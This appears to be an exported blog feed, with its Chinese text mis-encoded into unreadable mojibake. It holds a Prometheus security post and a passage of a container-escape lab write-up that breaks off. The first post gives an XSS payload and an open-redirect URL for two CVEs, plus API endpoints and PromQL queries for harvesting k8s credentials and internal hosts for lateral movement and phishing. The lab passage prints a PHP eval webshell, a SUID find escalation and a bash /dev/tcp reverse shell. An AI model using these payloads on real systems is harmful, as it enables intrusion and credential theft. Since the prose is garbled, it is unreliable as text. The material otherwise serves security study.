<th align="center">æœåŠ¡ç«¯ï¼Œç”¨äºæŠ“å–å’Œå­˜å‚¨æ—¶é—´åºåˆ—æ•°æ®</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><a href="https://prometheus.io/docs/instrumenting/clientlibs/">client libraries</a></td>
<td align="center">å®¢æˆ·ç«¯åº“ï¼Œç”¨äºæ£€æµ‹åº”ç”¨ç¨‹åºä»£ç </td>
</tr>
<tr>
<td align="center"><a href="https://github.com/prometheus/pushgateway">push gateway</a></td>
<td align="center">åœ¨ä¸æ”¯æŒpull æ‹‰å–ç›‘æ§æ•°æ®çš„åœºæ™¯ä¸­ï¼Œå¯é€šè¿‡éƒ¨ç½²Pushgatewayçš„æ–¹å¼ï¼Œç”±ç›‘æ§æºä¸»åŠ¨ä¸ŠæŠ¥åˆ°Promtehus</td>
</tr>
<tr>
<td align="center"><a href="https://prometheus.io/docs/instrumenting/exporters/">exporters</a></td>
<td align="center">ç›‘æ§å®¢æˆ·ç«¯ï¼Œç”¨äºæ”¶é›†å„ç±»ç›‘æ§æ•°æ®ï¼Œä¸åŒçš„ç›‘æ§éœ€æ±‚ç”±ä¸åŒçš„exporterå¤„ç†ï¼Œå¦‚node-exporterã€mysql-exporterã€blackbox-exporterç­‰ã€‚</td>
</tr>
<tr>
<td align="center"><a href="https://github.com/prometheus/alertmanager">alertmanager</a></td>
<td align="center">ç‹¬ç«‹ç»„ä»¶ï¼Œç”¨äºå¤„ç†å‘Šè­¦ä¿¡æ¯</td>
</tr>
<tr>
<td align="center">various support tools</td>
<td align="center">å…¶ä»–å„ç§æ”¯æŒå·¥å…·</td>
</tr>
<tr>
<td align="center"><a href="https://prometheus.io/docs/prometheus/latest/querying/basics/">PromQL</a></td>
<td align="center">å®˜æ–¹æä¾›çš„ç”¨äºæ•°æ®æŸ¥è¯¢çš„åŠŸèƒ½æ€§æŸ¥è¯¢è¯­è¨€</td>
</tr>
</tbody></table>
<h2 id="2-å†å²æ¼æ´"><a href="#2-å†å²æ¼æ´" class="headerlink" title="2.å†å²æ¼æ´"></a>2.å†å²æ¼æ´</h2><h3 id="1-CVE-2019-3826"><a href="#1-CVE-2019-3826" class="headerlink" title="1. CVE-2019-3826"></a>1. CVE-2019-3826</h3><p>è¿™æ˜¯ä¸€ä¸ªå­˜å‚¨å‹ <code>XSS</code> æ¼æ´, å½±å“ç‰ˆæœ¬ä¸º:<code> 2.7.1</code> ä¹‹å‰ã€‚</p>
<p>è¿™ä¸ªåˆ©ç”¨æœ‰ä¸ªå‰ææ¡ä»¶: éœ€è¦å¼€å¯<code>enable query history</code>,ä¹Ÿå°±æ˜¯è®°å½•æŸ¥è¯¢å†å²éœ€è¦å¼€å¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201057065.png" alt="image-20220927165327558"></p>
<p>è¿™ä¸ªå‰ç«¯å°±å¯ä»¥å¼€å¯ï¼Œè€Œä¸”é»˜è®¤å¯ç”¨ã€‚</p>
<p>ä¹‹åæ”»å‡»è€…æ„é€ ä¸€æ¡ç‰¹æ®Šçš„æŸ¥è¯¢è¯­å¥ï¼Œ<code>test&#123;test=&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&#125;</code>,æ‰§è¡Œä¸€ä¸‹ï¼Œ</p>
<p>ä¹‹ååœ¨æŸ¥è¯¢ä¸­è¾“å…¥ä¸€ä¸ªå¯ä»¥è®©è¿™æ¡è®°å½•å‡ºç°çš„å•è¯æ‰èƒ½è§¦å‘,æ¯”å¦‚è¯´<code>t</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201057517.png" alt="image-20220927180430311"></p>
<p>å„ä½çœ‹å®˜çœ‹åˆ°è¿™é‡Œï¼Œæ¥ä¸‹æ¥å¯èƒ½ä¼šæƒ³æ€ä¹ˆç»„åˆåˆ©ç”¨äº†ã€‚ä½†æ˜¯å•Šï¼Œå‡¡æ˜¯éƒ½æœ‰ä¸ªä½†æ˜¯ï¼Œè¿™ä¸ª<code>XSS</code>æ¼æ´è§¦å‘åŸå› æ˜¯**å› ä¸ºå¼€å¯<code>history</code>åï¼Œä¹‹åçš„æŸ¥è¯¢è¾“å…¥ä¼šé«˜äº®æç¤º **ï¼Œé—®é¢˜å°±å‡ºç°åœ¨è¿™é‡Œï¼Œå­˜å‚¨å’Œæ¸²æŸ“æ—¶æœªåšä»»ä½•è¿‡æ»¤ <code>web/ui/static/js/graph/index.js</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201057850.png" alt="image-20220927180843214"></p>
<p>ç„¶åå†è¯´è¯´ä¸ºå•¥ä¼šæ˜¯<code>å­˜å‚¨å‹</code>ï¼Œå› ä¸ºè¿™ä¸ªæŸ¥è¯¢å†å²å­˜å‚¨åœ¨äº†æµè§ˆå™¨çš„ <code>Local Storage</code>ï¼Œè¿™ä½ è®©æˆ‘å¼¹è°ï¼Ÿï¼Ÿï¼Ÿå› å¹æ–¯æ±€</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201058681.png" alt="image-20220927181006925"></p>
<h3 id="2-CVE-2021-29622"><a href="#2-CVE-2021-29622" class="headerlink" title="2. CVE-2021-29622"></a>2. CVE-2021-29622</h3><p>è¿™æ˜¯ä¸€ä¸ªé‡å®šå‘æ¼æ´ï¼Œå®˜æ–¹æè¿°</p>
<blockquote>
<p>  åœ¨ 2.23.0 ä¸­ï¼ŒPrometheus å°†å…¶é»˜è®¤ UI æ›´æ”¹ä¸º New uiã€‚ä¸ºç¡®ä¿æ— ç¼è½¬æ¢ï¼ŒURL ä»¥ <code>/new</code> ä¸ºå‰ç¼€é‡å®šå‘åˆ° <code>/</code>ã€‚ç”±äºä»£ç ä¸­çš„é”™è¯¯ï¼Œæ”»å‡»è€…æœ‰å¯èƒ½åœ¨ <code>/new</code> ç«¯ç‚¹ä¸­åˆ¶ä½œä¸€ä¸ªå¯ä»¥é‡å®šå‘åˆ°ä»»ä½•å…¶ä»– URL çš„ URLã€‚å¦‚æœç”¨æˆ·ä½¿ç”¨ç‰¹åˆ¶åœ°å€è®¿é—® prometheus æœåŠ¡å™¨ï¼Œä»–ä»¬å¯ä»¥è¢«é‡å®šå‘åˆ°ä»»æ„ URLã€‚</p>
<p>  è¯¥é—®é¢˜å·²åœ¨ 2.26.1 å’Œ 2.27.1 ç‰ˆæœ¬ä¸­ä¿®å¤ã€‚åœ¨ 2.28.0 ä¸­ï¼Œ<code>/new</code> ç«¯ç‚¹å°†è¢«å®Œå…¨åˆ é™¤ã€‚ä¿®è¡¥æ–¹æ¡ˆæ˜¯é€šè¿‡ Prometheus å‰é¢çš„åå‘ä»£ç†ç¦ç”¨å¯¹ <code>/new</code> çš„è®¿é—®ã€‚</p>
</blockquote>
<p><code>git checkout v2.24.0</code>ï¼Œåˆ‡æ¢æœ‰æ¼æ´çš„åˆ†æ”¯,çœ‹ä»£ç  <code>web/web.go</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201058832.png" alt="image-20220927162146823"></p>
<p>emmmmï¼Œæ²¡å•¥å¥½è¯´çš„ï¼Œå½“ url ä¸º <code>http://127.0.0.1:19090/new/newhttps://www.baidu.com</code> è¿™ç§æ—¶ï¼Œ<code>p</code>å°±ç­‰äº <code>/newhttps://www.baidu.com</code>,ç„¶åå»é™¤<code>/new</code>å‰ç¼€,ä½¿ç”¨ path åŒ…ç»„åˆæˆ url è¿›è¡Œé‡å®šå‘ã€‚</p>
<h4 id="CodeQL-åˆ†æ"><a href="#CodeQL-åˆ†æ" class="headerlink" title="CodeQL åˆ†æ"></a>CodeQL åˆ†æ</h4><p>å®˜æ–¹ codeql ä¸­å…³äºgoçš„è§„åˆ™ä¸­æ²¡æœ‰é‡å®šå‘æµ‹è¯•ç”¨ä¾‹ï¼Œåªæœ‰å†™å¥½çš„åº“(<code>lib/semmle/go/security/OpenUrlRedirect.qll</code>è¿™ä¸ªè°ƒç”¨è¿è¡Œè·‘ä¸å‡ºè¯¥æ¼æ´ï¼Œåªèƒ½è·‘å‡ºåä¸¤ä¸ª)ï¼Œå…¶ä»–è¯­è¨€å­˜åœ¨ç›¸å…³çš„æµ‹è¯•ç”¨ä¾‹ï¼Œæ¨¡ä»¿python çš„é‡å®šå‘æµ‹è¯•å†™ä¸€ä¸ªã€‚</p>
<p><code>UrlRedirectQuery.qll</code> å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">import go</span><br><span class="line"></span><br><span class="line">import semmle.go.security.UrlConcatenation</span><br><span class="line"></span><br><span class="line">import semmle.go.security.OpenUrlRedirectCustomizations::OpenUrlRedirect</span><br><span class="line">abstract <span class="class"><span class="keyword">class</span> <span class="title">Sanitizer</span> <span class="title">extends</span> <span class="title">DataFlow</span>:</span>:Node &#123; &#125;</span><br><span class="line">abstract deprecated <span class="class"><span class="keyword">class</span> <span class="title">SanitizerGuard</span> <span class="title">extends</span> <span class="title">DataFlow</span>:</span>:BarrierGuard &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A data-flow configuration for reasoning about unvalidated URL redirections.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Configuration</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration &#123;</span><br><span class="line">    Configuration() &#123; this = <span class="string">&quot;UrlRedirect&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123; source instanceof Source &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123; sink instanceof Sink &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSanitizer(DataFlow::Node node) &#123; node instanceof Sanitizer &#125;</span><br><span class="line"></span><br><span class="line">    deprecated override predicate isSanitizerGuard(DataFlow::BarrierGuard guard) &#123;</span><br><span class="line">        guard instanceof SanitizerGuard</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>UrlRedirect.ql</code> å†…å®¹å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">import go <span class="comment">/* æ¯ä¸ªæŸ¥è¯¢éƒ½ä»¥ä¸€ä¸ªæˆ–å¤šä¸ªimportè¯­å¥å¼€å§‹ã€‚ */</span></span><br><span class="line">import UrlRedirectQuery  <span class="comment">/* å¼•ç”¨åˆšæ‰çš„åº“æ–‡ä»¶/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/* DataFlow æ¨¡å— è´Ÿè´£å®ç°ä»£ç çš„æ•°æ®æµè·Ÿè¸ªåŠŸèƒ½ï¼Œå³å®ç°æ•´ä¸ªçš„è°ƒç”¨æ ˆåˆ†æã€‚ */</span></span><br><span class="line"><span class="comment">/* å®šä¹‰å˜é‡  */</span></span><br><span class="line">from Configuration config, DataFlow::PathNode source, DataFlow::PathNode sink </span><br><span class="line"></span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink,<span class="string">&quot;Untrusted URL redirection due to $@.&quot;</span>, source.getNode(),</span><br><span class="line"><span class="string">&quot;user-provided value&quot;</span></span><br></pre></td></tr></table></figure>

<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201058129.png" alt="image-20221013145923377"></p>
<p>ç¬¬ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬åˆšæ‰åˆ†æçš„æ¼æ´,å¦å¤–ä¸¤ä¸ª <code>subpath</code> è™½ç„¶å¯æ§ï¼Œä½†åˆ†æè¿‡åç¡®è®¤ä¸ºè¯¯æŠ¥</p>
<h2 id="3-metrics"><a href="#3-metrics" class="headerlink" title="3.metrics"></a>3.metrics</h2><blockquote>
<p>  Metricsæ˜¯ä¸€æ¬¾ç›‘æ§æŒ‡æ ‡çš„åº¦é‡ç±»åº“ï¼Œæä¾›äº†è®¸å¤šå·¥å…·å¸®åŠ©å¼€å‘è€…æ¥å®Œæˆå„é¡¹æ•°æ®çš„ç›‘æ§ã€‚</p>
</blockquote>
<p>Prometheus Server é»˜è®¤ä¼šä» <code>/metrics</code> api ä¸­æ‹‰å–æ•°æ®ï¼ŒæŒ‡æ ‡æ•°æ®æ ·æœ¬ç¤ºä¾‹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201058264.png" alt="image-20220926171326026"></p>
<blockquote>
<p>  ç¬¬ä¸€ä¸ª# æ˜¯æŒ‡æ ‡çš„è¯´æ˜ä»‹ç»ï¼Œ</p>
<p>  ç¬¬äºŒä¸ª# ä»£è¡¨æŒ‡æ ‡çš„ç±»å‹ï¼Œæ­¤ä¸ºå¿…é¡»é¡¹ä¸”æ ¼å¼å›ºå®šï¼ŒTYPE+æŒ‡æ ‡åç§°+ç±»å‹</p>
<p>  go_gc_duration_seconds ä¸ºæŒ‡æ ‡åç§°ï¼Œ{}é‡Œé¢ä¸ºæ ‡ç­¾ï¼Œå®ƒæ ‡æ˜äº†å½“å‰æŒ‡æ ‡æ ·æœ¬çš„ç‰¹å¾å’Œç»´åº¦ï¼Œæœ€åé¢çš„æ•°å€¼åˆ™æ˜¯è¯¥æ ·æœ¬çš„å…·ä½“å€¼</p>
</blockquote>
<h2 id="4-æ”»å‡»åˆ©ç”¨"><a href="#4-æ”»å‡»åˆ©ç”¨" class="headerlink" title="4.æ”»å‡»åˆ©ç”¨"></a>4.æ”»å‡»åˆ©ç”¨</h2><p>Prometheus çš„å„ç§æœåŠ¡åœ¨ 2.24.0 ç‰ˆæœ¬ä¹‹å‰éƒ½æ˜¯å…è®¸ä»»ä½•äººè®¿é—®çš„ï¼Œå®˜æ–¹è®¤ä¸º Prometheus æŠ“å–çš„å„ç§æŒ‡æ ‡æ•°å­—ä¸æ˜¯æ•æ„Ÿæ•°æ®ï¼Œæ¯”å¦‚æè¿° CPU è´Ÿè½½æˆ–å‘é€åˆ°æœåŠ¡çš„è¯·æ±‚æ•°é‡ç­‰å€¼ï¼Œå¯¹äºæ”»å‡»è€…æ¥è¯´å®Œå…¨æ— ç”¨ï¼Œå› æ­¤Prometheusæ•´ä½“åªä¸“æ³¨äºå¼€å‘å’Œç›‘æ§ç›¸å…³çš„åŠŸèƒ½ã€‚</p>
<p>2.24.0 æ‰å‡ºç°è®¤è¯ç›¸å…³çš„åŠŸèƒ½ï¼Œä½†å…¬ç½‘ä¸Šè®¸å¤šä½¿ç”¨äº†Prometheusçš„ç»„ç»‡è¿˜æœªå¯ç”¨è¿™äº›åŠŸèƒ½,è¿˜æ˜¯å­˜åœ¨å¤§é‡çš„æœªæˆæƒçš„PrometheusæœåŠ¡ã€‚</p>
<h3 id="1-å¯åˆ©ç”¨æ¥å£"><a href="#1-å¯åˆ©ç”¨æ¥å£" class="headerlink" title="1.å¯åˆ©ç”¨æ¥å£"></a>1.å¯åˆ©ç”¨æ¥å£</h3><p>ä¸‹é¢åˆ—ä¸¾ä¸€äº›å¯èƒ½å­˜åœ¨åˆ©ç”¨çš„ç‚¹</p>
<ul>
<li><p><strong>&#x2F;api&#x2F;v1&#x2F;status&#x2F;config</strong></p>
<p>è¿™é‡Œä¼šæ³„éœ²å‘Šè­¦&#x2F;æ•°æ®è·å–æœåŠ¡çš„åœ°å€ï¼Œè®¿é—®ç”¨æˆ·åç­‰ã€‚ä»¤äººä¸çˆ½çš„æ˜¯ï¼ŒPrometheus ä¼šä½¿ç”¨ <secret> å ä½ç¬¦æ›¿æ¢æ‰å¯†ç ç­‰ä¸€äº›æ•æ„Ÿä¿¡æ¯ã€‚<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201058734.png" alt="image-20221010163836969"></p>
<p>ps: è¿™é‡Œçš„ <secret> åªä¼šæ›¿æ¢ä¸€äº›å®˜æ–¹å®šä¹‰å¥½çš„å­—æ®µï¼Œå¦‚æœé…ç½®äººå‘˜å°†å¯†ç ä¿¡æ¯ç­‰å†™åœ¨äº† url ä¸­</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201058666.png" alt="image-20221017112811908"></p>
<p>Prometheuså¹¶ä¸ä¼šå¯¹è¿™äº›è¿›è¡Œå¤„ç†ï¼Œè™½ç„¶æ¦‚ç‡æœ‰ç‚¹å°ï¼Œä½†æ‰¾åˆ°å°±æ˜¯èµšã€‚</p>
<p>å¦‚æœç›‘æ§äº† k8s æœåŠ¡ï¼Œconfig ä¸­ä¼šæ˜¾ç¤º k8s è®¤è¯çš„ç›¸å…³ä¿¡æ¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201059749.png" alt="image-20221017111516349"></p>
<p>è¿™é‡Œç›´æ¥å‘Šè¯‰æˆ‘ä»¬ k8sè®¤è¯ token å’Œè¯ä¹¦çš„ä½ç½®ï¼Œå¦‚æœèƒ½æ‰“ä¸‹è¿™å°æœºå™¨ï¼Œåç»­æ¨ªå‘å°±å¾ˆç®€å•äº†ã€‚</p>
</li>
<li><p>**&#x2F;api&#x2F;v1&#x2F;targets **</p>
<p>ç›‘æ§çš„å„ç§æœåŠ¡ï¼Œé€šè¿‡è¿™ä¸ª api æˆ‘ä»¬å¯ä»¥è·å–ç›®æ ‡çš„å…¶ä»–èµ„äº§æœºå™¨åœ°å€ï¼Œæ ‡ç­¾ç­‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201059634.png" alt="image-20221010165510417"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201059778.png" alt="image-20221010165554239"></p>
<p>â€‹	æ¯”å¦‚è¿™ä¸ªï¼Œç›´æ¥ä¸ºæˆ‘ä»¬æä¾›äº† 178 ä¸ªæœåŠ¡çš„ä¿¡æ¯ï¼Œä¸ºåæœŸçš„å†…ç½‘æ¨ªå‘æä¾›éå¸¸ä¸é”™çš„å¸®åŠ©ï¼Œè€Œä¸”è¿˜ä¸ç”¨æ‰«æï¼Œå®‰å…¨éšè”½ã€‚å¦‚æœè¿æ°”å¤Ÿå¥½ï¼Œä¹Ÿè®¸è¿˜èƒ½æ‰¾åˆ° k8s çš„ç”¨æˆ·åã€å¯†ç ä¿¡æ¯ã€ç¯å¢ƒå˜é‡ç­‰ã€‚</p>
<p>â€‹	åŸºäº GCE æœåŠ¡å‘ç°æ—¶ï¼Œå¯èƒ½ä¼šæ³„éœ²æœºå™¨çš„ç”¨æˆ·åã€sshå…¬é’¥ï¼Œè¿™é‡Œå¯ä»¥å°è¯•å‘é€é’“é±¼é‚®ä»¶ï¼Œè¿›ä¸€æ­¥åˆ©ç”¨ã€‚<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201059594.png" alt="image-20221018154630440"></p>
<p>â€‹	åŸºäºAWS EC2çš„æœåŠ¡å‘ç°ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾çš„æ‹¿åˆ°æœºå™¨ä½¿ç”¨çš„ç³»ç»Ÿé•œåƒã€è¿è¡Œå®ä¾‹çš„åœ°åŒºã€aws è´¦æˆ· idã€å®ä¾‹çš„ç½‘ç»œåœ°å€ç­‰ç­‰ä¿¡æ¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201059593.png" alt="image-20221018155931705"> </p>
</li>
<li><p><strong>ç®¡ç†å‘˜æ¥å£</strong></p>
</li>
</ul>
<p>è®¿é—® <code>/api/v1/status/flags</code>ï¼Œå¦‚æœ <code>web.enable-lifecycle</code> ä¸º trueï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å…³é—­	PrometheusæœåŠ¡ï¼Œ<code>web.enable-admin-api</code>å¼€å¯åˆ™å¯ä»¥åˆ é™¤ç›‘æ§çš„æ•°æ®ã€‚</p>
<h3 id="2-PromQL"><a href="#2-PromQL" class="headerlink" title="2.PromQL"></a>2.PromQL</h3><p>Prometheus æä¾›äº†ä¸€ç§ç§°ä¸º PromQLï¼ˆPrometheus Query Languageï¼‰çš„åŠŸèƒ½æ€§æŸ¥è¯¢è¯­è¨€ï¼Œè®©ç”¨æˆ·å¯ä»¥å®æ—¶é€‰æ‹©å’Œèšåˆæ—¶é—´åºåˆ—æ•°æ®ã€‚</p>
<p>ä¸‹é¢æ˜¯ä»ç½‘ç»œä¸Šæ”¶é›†çš„ä¸€äº›æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æä¾›æœ‰å…³æ¯ä¸ªKubernetes èŠ‚ç‚¹çš„ä¿¡æ¯: äº‘ä¾›åº”å•†çš„åç§°ã€äº§å“åç§°</span><br><span class="line">node_dmi_info</span><br><span class="line"></span><br><span class="line"># æä¾›ç½‘ç»œç›¸å…³ä¿¡æ¯</span><br><span class="line">node_network_info&#123;device=~&#x27;eth.+&#x27;&#125;</span><br><span class="line"></span><br><span class="line"># k8s æ¯ä¸ªç»„ä»¶çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œgitæäº¤å’Œæ„å»ºæ—¥æœŸ</span><br><span class="line">kubernetes_build_info</span><br><span class="line"></span><br><span class="line"># k8s é›†ç¾¤çš„è´Ÿè½½å‡è¡¡å™¨ä¿¡æ¯</span><br><span class="line">kube_service_info * on (service) group_left group by (service,type) (kube_service_spec_type&#123;type=&quot;LoadBalancer&quot;&#125;)</span><br><span class="line"></span><br><span class="line"># k8s èŠ‚ç‚¹ä¿¡æ¯</span><br><span class="line">kube_node_info</span><br><span class="line"></span><br><span class="line"># k8s ä¸­å…¥å£æ§åˆ¶å™¨çš„ URL è·¯å¾„å’Œç›¸å…³æœåŠ¡çš„ä¿¡æ¯ç­‰</span><br><span class="line">kube_ingress_info</span><br><span class="line"></span><br><span class="line"># k8s pods ä¿¡æ¯</span><br><span class="line">kube_pod_info</span><br><span class="line"># pods ä¿¡æ¯ä¸å·¥ä½œè´Ÿè½½å…³è”</span><br><span class="line">kube_pod_info * on(namespace,pod) group_left(owner_name) kube_pod_owner</span><br><span class="line"># pods ä¸­çš„å®¹å™¨ä¿¡æ¯</span><br><span class="line">kube_pod_container_info</span><br><span class="line"></span><br><span class="line"># k8s é›†ç¾¤çš„å‘½åç©ºé—´ã€èŠ‚ç‚¹å’ŒSecretåç§°</span><br><span class="line">kube_secret_info</span><br><span class="line"># è·å–SecreSä¸­æ³¨è§£ç›¸å…³ä¿¡æ¯ï¼Œå¯èƒ½å­˜åœ¨ä¸€äº›æ•æ„Ÿä¿¡æ¯</span><br><span class="line">kube_secret_annotations&#123;kubectl_kubernetes_io_last_applied_configuration != &quot;&quot;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-æ€»ç»“"><a href="#3-æ€»ç»“" class="headerlink" title="3.æ€»ç»“"></a>3.æ€»ç»“</h3><p>æ”»é˜²ä¸­æœ€é‡è¦çš„ä¸€æ­¥å°±æ˜¯å°½å¯èƒ½å¤šåœ°æ”¶é›†ä¸ç›®æ ‡æœ‰å…³çš„ä¿¡æ¯ï¼Œè™½ç„¶ Prometheus æœ¬èº«æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œä½†æˆ‘ä»¬å´å¯ä»¥ä»å®ƒæ‰€ç›‘æ§çš„æœåŠ¡ä¿¡æ¯ä¸­è·å–ä¸€äº›å¯èƒ½æœ‰ç”¨æ•°æ®ã€‚è¿™äº›æ•°æ®ä¸ä»…ä»…å¯ä»¥ä½œä¸ºåæ¸—é€æ¨ªå‘ä½¿ç”¨ï¼Œè¿˜å¯ä»¥ç”¨æ¥ä¼ªé€ ä¿¡æ¯è¿›è¡Œé’“é±¼ã€‚</p>
<h2 id="5-å‚è€ƒ"><a href="#5-å‚è€ƒ" class="headerlink" title="5.å‚è€ƒ"></a>5.å‚è€ƒ</h2><p><a href="https://jfrog.com/blog/dont-let-prometheus-steal-your-fire/">https://jfrog.com/blog/dont-let-prometheus-steal-your-fire/</a></p>
<p><a href="https://sysdig.com/blog/exposed-prometheus-exploit-kubernetes-kubeconeu/">https://sysdig.com/blog/exposed-prometheus-exploit-kubernetes-kubeconeu/</a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ - CNCF</category>
      </categories>
      <tags>
        <tag>æ¼æ´åˆ†æ</tag>
        <tag>CNCF</tag>
      </tags>
  </entry>
  <entry>
    <title>ç®€å•dockersé€ƒé€¸å­¦ä¹ </title>
    <url>/2020/08/04/%E7%AE%80%E5%8D%95docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="1-ç›®æ ‡ç•Œé¢"><a href="#1-ç›®æ ‡ç•Œé¢" class="headerlink" title="1. ç›®æ ‡ç•Œé¢"></a>1. ç›®æ ‡ç•Œé¢</h2><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png"></p>
<p>æåŠå¤©ï¼Œæ²¡è¿›å»ã€‚ã€‚ã€‚ã€‚</p>
<p>ç»è¿‡æç¤ºï¼Œäº†è§£åˆ°äº†ä¸€å¥è¯æ‰§è¡Œçš„åŸç†ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸€å¥è¯åœ¨æ¯æ¬¡æ‰§è¡Œæ—¶ï¼Œæ¥æ”¶å˜é‡cmdä¼ è¿›å»çš„å‚æ•° <code>cmd=phpinfo(); </code> ä½¿ç”¨evalå‡½æ•°æ‰§è¡Œ phpinfo(); å‘½ä»¤ã€‚</p>
<p>äº†è§£åå°±æ˜¯çŒœå‚æ•°åçš„è¿‡ç¨‹ã€‚</p>
<h2 id="2-ææƒ"><a href="#2-ææƒ" class="headerlink" title="2. ææƒ"></a>2. ææƒ</h2><p>è¿ä¸Šshellåï¼Œ <code>whoami</code> æŸ¥çœ‹ä¸ºwww-dataæƒé™ï¼Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2.png"></p>
<p>é€šè¿‡uname -a å’Œ cat &#x2F;etc&#x2F;*-release æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ï¼Œæ²¡æœ‰ææƒexp</p>
<p>!<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/4.png"></p>
<p><a href="https://www.anquanke.com/post/id/86979">åˆ©ç”¨å¯æ‰§è¡Œæ–‡ä»¶SUID</a></p>
<p>é€šè¿‡å‘½ä»¤æŸ¥çœ‹</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/3.png"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> suid <span class="comment"># ä¹Ÿå¯ä»¥ä¸ç”¨åˆ›å»ºï¼Œåªè¦æŸ¥æ‰¾çš„æ–‡ä»¶çœŸå®å­˜åœ¨å³å¯</span></span><br><span class="line">find suid -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/5.png"></p>
<h2 id="3-åå¼¹shell-ï¼Œä»¥åŠè·å–å®Œå…¨äº¤äº’å¼shell"><a href="#3-åå¼¹shell-ï¼Œä»¥åŠè·å–å®Œå…¨äº¤äº’å¼shell" class="headerlink" title="3. åå¼¹shell ï¼Œä»¥åŠè·å–å®Œå…¨äº¤äº’å¼shell"></a>3. åå¼¹shell ï¼Œä»¥åŠè·å–å®Œå…¨äº¤äº’å¼shell</h2><p>å…¬ç½‘nc ç›‘å¬ ç«¯å£</p>
<p>bash åå¼¹ </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/å…¬ç½‘ip/ç«¯å£ 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>å¤±è´¥ã€‚ã€‚ã€‚</p>
